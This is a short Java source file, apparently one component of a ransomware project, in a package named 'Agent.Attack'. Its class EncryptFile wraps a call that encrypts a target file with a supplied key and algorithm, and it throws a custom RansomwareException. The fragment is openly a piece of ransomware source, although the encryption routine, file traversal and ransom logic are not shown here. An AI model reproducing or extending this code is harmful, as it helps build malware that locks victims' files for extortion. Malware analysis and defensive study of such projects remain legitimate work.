package Agent.Attack;

import java.io.File;

import javax.crypto.SecretKey;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;

public class EncryptFile implements Cryptable {

	@Override
	public void doingCrypto(CryptoKey key, File file, CryptoAlgorithm crypto) throws RansomwareException {
		try {
			crypto.encrypt(key.getKey(), file);
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}

	}
}